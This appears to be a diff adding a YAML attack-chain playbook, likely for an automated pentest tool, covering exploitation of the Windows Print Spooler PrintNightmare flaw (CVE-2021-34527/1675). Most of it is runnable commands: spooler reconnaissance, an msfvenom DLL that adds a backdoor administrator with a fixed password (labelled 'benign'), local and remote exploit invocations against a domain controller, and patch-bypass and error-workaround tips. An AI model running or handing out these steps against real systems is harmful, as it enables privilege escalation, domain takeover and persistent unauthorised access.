@@ -1,0 +1,68 @@
+chain_id: printnightmare_cve_2021_34527
+title: "Windows — PrintNightmare (CVE-2021-34527 / 1675) Print Spooler → SYSTEM"
+severity: CRITICAL
+tags: [windows, printnightmare, cve-2021-34527, cve-2021-1675, spooler, rpc, privesc]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2021-34527" }
+    - { kind: "CVE-2021-1675" }
+    - { service_pattern: "(?i)spoolss|spoolsv|msrpc-print" }
+    - { banner_pattern: "(?i)windows\\s*server|spoolsv|print\\s*spooler" }
+
+description: |
+  Windows Print Spooler (every Server SKU + workstation) accepts an
+  `RpcAddPrinterDriverEx` from any authenticated user that loads an
+  attacker-supplied DLL as SYSTEM. Local variant: SYSTEM from any
+  shell. Remote variant: any domain user can target a remote DC's
+  spooler and get SYSTEM there. The "patch" went through 4 rounds —
+  many fully-patched boxes are still vulnerable depending on
+  PointAndPrint registry values.
+
+steps:
+  - id: 1
+    title: "Confirm Spooler is running on the target"
+    command: |
+      impacket-rpcdump @$VICTIMA | grep -i 'spool\\|MS-RPRN'
+      sc.exe query Spooler   # local
+
+  - id: 2
+    title: "Build a benign DLL that just adds a local admin"
+    command: |
+      msfvenom -p windows/x64/exec CMD='net user rootctl Rootctl123! /add && net localgroup administrators rootctl /add' \
+        -f dll -o /tmp/rootctl.dll
+      smbserver.py -smb2support share /tmp
+
+  - id: 3
+    title: "Exploit — local SYSTEM"
+    command: |
+      # PowerShell on the target:
+      Import-Module .\\CVE-2021-1675.ps1
+      Invoke-Nightmare -DriverName 'rootctl' -NewUser 'rootctl' -NewPassword 'Rootctl123!'
+
+  - id: 4
+    title: "Exploit — remote (against a DC's spooler)"
+    command: |
+      git clone https://github.com/cube0x0/CVE-2021-1675 /tmp/pn
+      python3 /tmp/pn/CVE-2021-1675.py DOMAIN/USER:'PASS'@DC.DOMAIN '\\\\10.0.2.15\\share\\rootctl.dll'
+
+  - id: 5
+    title: "If patched: check PointAndPrint policy (still owns)"
+    command: |
+      reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint"
+      # NoWarningNoElevationOnInstall=1 → still vulnerable post-patch.
+
+common_errors:
+  - error: "spoolss returns ERROR_ACCESS_DENIED"
+    solution: |
+      Spooler restricted by `RestrictDriverInstallationToAdministrators=1`.
+      Try the variant CVE-2021-36958 (Container/Queue-specific), or
+      pivot to PrintSpoofer/EfsPotato if you have SeImpersonate.
+  - error: "DLL doesn't load — bad arch"
+    solution: |
+      Spooler is the OS bitness — match it. 64-bit Windows ≠ DLL must
+      be 64-bit, even when running 32-bit shells.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-34527
+  - https://github.com/cube0x0/CVE-2021-1675
